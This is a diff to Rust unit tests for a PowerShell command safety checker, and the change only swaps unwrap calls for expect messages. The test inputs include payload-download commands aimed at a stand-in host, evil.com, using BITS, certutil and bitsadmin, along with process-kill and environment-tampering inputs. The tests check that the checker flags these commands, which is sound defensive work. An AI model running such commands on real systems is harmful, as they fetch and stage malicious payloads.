@@ -880,7 +880,11 @@ mod tests {
     fn test_dynamic_command_name_variable() {
         let result = powershell_command_is_safe("& $cmd args");
         assert!(is_ask(&result));
-        assert!(ask_message(&result).unwrap().contains("dynamic expression"));
+        assert!(
+            ask_message(&result)
+                .expect("should have ask message")
+                .contains("dynamic expression")
+        );
     }
 
     #[test]
@@ -912,7 +916,11 @@ mod tests {
         let result =
             powershell_command_is_safe("Start-BitsTransfer -Source http://evil.com/payload.exe");
         assert!(is_ask(&result));
-        assert!(ask_message(&result).unwrap().contains("BITS"));
+        assert!(
+            ask_message(&result)
+                .expect("should have ask message for BITS")
+                .contains("BITS")
+        );
     }
 
     #[test]
@@ -920,7 +928,11 @@ mod tests {
         let result =
             powershell_command_is_safe("certutil -urlcache -split -f http://evil.com/payload.exe");
         assert!(is_ask(&result));
-        assert!(ask_message(&result).unwrap().contains("certutil"));
+        assert!(
+            ask_message(&result)
+                .expect("should have ask message for certutil")
+                .contains("certutil")
+        );
     }
 
     #[test]
@@ -929,7 +941,11 @@ mod tests {
             "bitsadmin /transfer myjob /download /priority high http://evil.com/payload.exe C:\\payload.exe",
         );
         assert!(is_ask(&result));
-        assert!(ask_message(&result).unwrap().contains("BITS"));
+        assert!(
+            ask_message(&result)
+                .expect("should have ask message for bitsadmin")
+                .contains("BITS")
+        );
     }
 
     // -- 3. Obfuscation --
@@ -974,7 +990,7 @@ mod tests {
         assert!(is_ask(&result));
         assert!(
             ask_message(&result)
-                .unwrap()
+                .expect("should have ask message for type literals")
                 .contains("ConstrainedLanguage")
         );
     }
@@ -1000,14 +1016,22 @@ mod tests {
     fn test_member_invocations_static() {
         let result = powershell_command_is_safe("[System.IO.File]::ReadAllText('test.txt')");
         assert!(is_ask(&result));
-        assert!(ask_message(&result).unwrap().contains(".NET"));
+        assert!(
+            ask_message(&result)
+                .expect("should have ask message for static invocation")
+                .contains(".NET")
+        );
     }
 
     #[test]
     fn test_member_invocations_instance() {
         let result = powershell_command_is_safe("$proc.Kill()");
         assert!(is_ask(&result));
-        assert!(ask_message(&result).unwrap().contains(".NET"));
+        assert!(
+            ask_message(&result)
+                .expect("should have ask message for instance invocation")
+                .contains(".NET")
+        );
     }
 
     // -- 5. File-path execution --
@@ -1016,7 +1040,11 @@ mod tests {
     fn test_dangerous_file_path_invoke_command() {
         let result = powershell_command_is_safe("Invoke-Command -FilePath script.ps1");
         assert!(is_ask(&result));
-        assert!(ask_message(&result).unwrap().contains("FilePath"));
+        assert!(
+            ask_message(&result)
+                .expect("should have ask message for file path")
+                .contains("FilePath")
+        );
     }
 
     #[test]
@@ -1031,7 +1059,11 @@ mod tests {
     fn test_for_each_member_name() {
         let result = powershell_command_is_safe("Get-Process | ForEach-Object -MemberName Kill");
         assert!(is_ask(&result));
-        assert!(ask_message(&result).unwrap().contains("MemberName"));
+        assert!(
+            ask_message(&result)
+                .expect("should have ask message for MemberName")
+                .contains("MemberName")
+        );
     }
 
     #[test]
@@ -1066,14 +1098,22 @@ mod tests {
     fn test_sub_expressions() {
         let result = powershell_command_is_safe("Write-Output $(Get-Process)");
         assert!(is_ask(&result));
-        assert!(ask_message(&result).unwrap().contains("subexpressions"));
+        assert!(
+            ask_message(&result)
+                .expect("should have ask message for subexpressions")
+                .contains("subexpressions")
+        );
     }
 
     #[test]
     fn test_expandable_strings() {
         let result = powershell_command_is_safe("Write-Output \"$env:PATH\"");
         assert!(is_ask(&result));
-        assert!(ask_message(&result).unwrap().contains("expandable"));
+        assert!(
+            ask_message(&result)
+                .expect("should have ask message for expandable strings")
+                .contains("expandable")
+        );
     }
 
     // -- 10. Environment manipulation --
@@ -1082,7 +1122,11 @@ mod tests {
     fn test_env_var_manipulation_set_item() {
         let result = powershell_command_is_safe("Set-Item -Path env:FOO -Value 'bar'");
         assert!(is_ask(&result));
-        assert!(ask_message(&result).unwrap().contains("environment"));
+        assert!(
+            ask_message(&result)
+                .expect("should have ask message for env manipulation")
+                .contains("environment")
+        );
     }
 
     #[test]
